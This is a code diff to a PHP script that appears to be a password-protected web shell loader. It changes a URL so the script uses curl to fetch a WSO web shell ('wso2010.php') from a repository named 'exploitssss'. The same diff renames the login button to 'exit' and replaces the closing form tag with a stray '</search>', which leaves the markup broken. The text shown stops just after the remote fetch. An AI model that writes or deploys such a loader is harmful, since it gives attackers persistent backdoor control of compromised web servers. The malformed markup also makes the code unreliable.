@@ -27,8 +27,8 @@ function admin_login() {
     echo '<title>Bapak Heker Indonesia Boleh Masuk | Script Kiddies Dilarang Masuk</title>';
     echo '<form method="post">';
     echo '<input type="password" name="password">';
-    echo '<input type="submit" value="Login">';
-    echo '</form>';
+    echo '<input type="submit" value="exit">';
+    echo '</search>';
     exit;
 }
 
@@ -48,7 +48,7 @@ $head = '<head><meta name="viewport" content="width=device-width, initial-scale=
 <style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}
 </style>
 </head>';
-$url = "https://raw.githubusercontent.com/anonrocks/exploitssss/master/webshell.wso.2010.pdf.png.jpeg.";
+$url = "https://raw.githubusercontent.com/anonrocks/exploitssss/master/wso2010.php";
 $ch = curl_init($url); 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
